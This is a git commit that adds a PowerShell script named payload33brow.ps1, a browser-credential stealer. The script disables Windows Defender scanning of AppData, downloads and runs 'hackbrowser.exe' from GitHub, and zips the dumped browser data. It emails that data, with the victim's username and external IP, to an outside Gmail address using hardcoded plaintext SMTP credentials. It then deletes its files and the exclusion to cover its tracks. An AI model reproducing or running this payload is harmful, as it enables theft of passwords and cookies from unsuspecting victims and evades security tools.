90bfd2607a85e2080db703c74120ec17d8d07ef8
karlosedson <141760028+karlosedson@users.noreply.github.com>
2023-11-04 13:37:38 -0300

    Add files via upload

---
+++ payload33brow.ps1
@@ -0,0 +1,37 @@
+
+#Adding windows defender exclusionpath
+Add-MpPreference -ExclusionPath "$env:appdata"
+#Creating the directory we will work on
+mkdir "$env:appdata\dump"
+Set-Location "$env:appdata\dump"
+#Downloading and executing hackbrowser.exe
+Invoke-WebRequest -Uri "https://github.com/karlosedson/BrowserMakerz/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
+./hb.exe
+Start-Sleep -Seconds 6
+Remove-Item -Path "$env:appdata\dump\hb.exe" -Force
+#Creating A Zip Archive
+Compress-Archive -Path * -DestinationPath dump.zip
+$Random = Get-Random
+#Mailing the output you will need to enable less secure app access on your google account for this to work
+$Message = new-object Net.Mail.MailMessage
+$smtp = new-object Net.Mail.SmtpClient("smtp.office365.com", 587)
+$smtp.Credentials = New-Object System.Net.NetworkCredential("karlosedson2007@outlook.com", "Brayan0078");
+$smtp.EnableSsl = $true
+$Message.From = "karlosedson2007@outlook.com"
+$Message.To.Add("lucascleber2007@gmail.com")
+$ip = Invoke-RestMethod "myexternalip.com/raw"
+$Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
+$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
+$Message.Body = $ComputerName
+$files=Get-ChildItem 
+$Message.Attachments.Add("$env:appdata\dump\dump.zip")
+$smtp.Send($Message)
+$Message.Dispose()
+$smtp.Dispose()
+#Cleanup
+Start-Sleep -Seconds 6
+cd "$env:appdata"
+Remove-Item -Path "$env:appdata\dump" -Force -Recurse
+Remove-MpPreference -ExclusionPath "$env:appdata"
+
+
